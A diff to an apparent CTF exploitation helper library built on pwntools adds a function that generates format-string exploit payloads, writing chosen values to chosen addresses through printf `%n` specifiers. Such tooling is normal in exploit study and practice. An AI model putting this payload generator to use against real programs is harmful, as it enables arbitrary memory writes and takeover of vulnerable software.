@@ -38,6 +38,7 @@ import subprocess
 import struct
 from pwn import unpack, pack, flat, ELF, context
 import click
+from math import ceil
 
 __all__ = [
     "int16",
@@ -82,7 +83,8 @@ __all__ = [
     "get_flag_by_recv",
     "get_segment_base_addr_by_proc_maps",
     "init_x86_context",
-    "init_x64_context"
+    "init_x64_context",
+    "fmtstr_payload_ex"
 ]
 
 int16 = functools.partial(int, base=16)
@@ -487,6 +489,139 @@ def init_x86_context(io, globals: dict, log_level: str="debug", timeout: int=5, 
 def init_x64_context(io, globals: dict, log_level: str="debug", timeout: int=5, arch: str="amd64", os: str="linux", endian: str="little"):
     context.update(arch=arch, os=os, endian=endian, log_level=log_level, timeout=timeout)
     _assign_globals(io, globals)
+
+
+def fmtstr_payload_ex(offset: int, writes: dict, numwritten: int=0, write_size: str="short", offset_bytes: int=0, debug: bool=False) -> bytes:
+    """fmtstr_payload_ex inspired by fmtstr_payload in pwntools
+
+    This function is more helpful, it allows you to control the length your want to write.
+    
+    Other parameters are identical with `fmtstr_payload' except `writes', its type is also dict, but you can specify the length you want to write.
+
+    for example:
+        fmtstr_payload_ex(offset=12, writes={
+            0xdead1000: 0x1234567890,
+            0xdead2000: [0x90876543, 2], # only write 2 bytes
+            0xdead3000: [0xaabbccdd, 3] # write 3 bytes
+        })
+
+    Args:
+        offset (int): Offset of fmt str
+        writes (dict): A dict of `addr:write_data'
+        numwritten (int, optional): The count of chars that printf has outputted. Defaults to 0.
+        write_size (str, optional): byte / short / int. Defaults to "short".
+        offset_bytes (int, optional): Offset to put this payload. Defaults to 0.
+        debug (bool, optional): Show debug info or not. Defaults to False.
+
+    Raises:
+        RuntimeError: when type of data is wrong.
+
+    Returns:
+        bytes: payload
+    """
+    pad = context.bits // 8
+    assert offset >= 0 and offset_bytes >= 0, "wrong para!"
+    assert pad in (4, 8), "wrong context.bits!"
+    assert write_size in ("byte", "short", "int"), "wrong write_size, only byte/short/int!"
+
+    _debug_write_dict = dict()
+    _real_write = dict()
+    if write_size == "byte":
+        _sz = 1
+    elif write_size == "short":
+        _sz = 2
+    else:
+        _sz = 4
+    _tmp_sz = _sz
+    while _tmp_sz:
+        _debug_write_dict[_tmp_sz] = dict()
+        _tmp_sz >>= 1
+    
+    for k, v in writes.items():
+        assert isinstance(k, int), "wrong key type in writes!"
+        assert k < (1 << (8 * pad)), "address out of bound!"
+
+        data = v
+        rs = pad # real size
+        if isinstance(v, (list, tuple)):
+            assert len(v) < 3 and len(v) > 0, "wrong format! format: writes={{addr:[data, length]}}!"
+            data = v[0]
+            if len(v) == 2:
+                rs= v[1]
+        else:
+            if not isinstance(v, int):
+                raise RuntimeError("wrong type of data!")
+        
+        assert rs <= pad, "wrong real size in data!"
+        assert isinstance(data, int), "wrong type of data!"
+
+        _tmp_sz = _sz
+        while _tmp_sz and rs:
+            t, m = divmod(rs, _tmp_sz)
+            for i in range(t):
+                _k = hex(k)
+                assert _k not in _debug_write_dict[_tmp_sz], "conflict address!"
+                _data = data & ((1 << (8 * _tmp_sz))-1)
+                _debug_write_dict[_tmp_sz][_k] = hex(_data)
+                if not _real_write.get(_data):
+                    _real_write[_data] = list()
+                _real_write[_data].append(("$" + "h"*(2 - (_tmp_sz >> 1)) + "n", k))
+
+                k += _tmp_sz
+                data >>= (8 * _tmp_sz)
+            _tmp_sz >>= 1
+            rs = m
+    if debug:
+        log_ex("current debug_write_data(format: write_size:(str, write_data)): %r" % _debug_write_dict)
+        log_ex("current real_write_data(format: write_data:[(str, write_size)]: %r" % _real_write)
+    first = list()
+    num_list = list()
+    cur_off = offset
+    pre_off = -1
+    first.append("#" * offset_bytes)
+    last = b""
+
+    for num in sorted(_real_write):
+        _l = _real_write[num]
+        for ap, addr in _l:
+            if num > 0:
+                assert num >= numwritten, "wrong numwritten!"
+                if num - numwritten > 0:
+                    first.append("%{}c".format(num - numwritten))
+                    numwritten = num
+            first.append("%")
+            first.append(str(cur_off))
+            num_list.append(len(first) - 1)
+            first.append(ap)
+            
+            # correct cur_off
+            while True:
+                cur_off = ceil(len("".join(first)) / pad) + offset
+                if pre_off == cur_off:
+                    break
+                pre_off = cur_off
+                for n in num_list:
+                    first[n] = str(cur_off)
+                    cur_off += 1
+
+
+            last += pack(addr, 8 * pad)
+    
+    real_output = "".join(first)
+    _ps = pad - (len(real_output) % pad)
+    if _ps < pad:
+        real_output += "a" * _ps
+    
+    if offset_bytes > 0:
+        real_output = real_output.lstrip("#" * offset_bytes)
+    
+    if debug:
+        log_ex("str of write data: %r" % real_output.encode())
+        log_ex("str of address data: %r" % last)
+    
+    return real_output.encode() + last
+
+            
 
 #-------------------------------private-------------------------------
 def _get_elf_arch_info(filename):
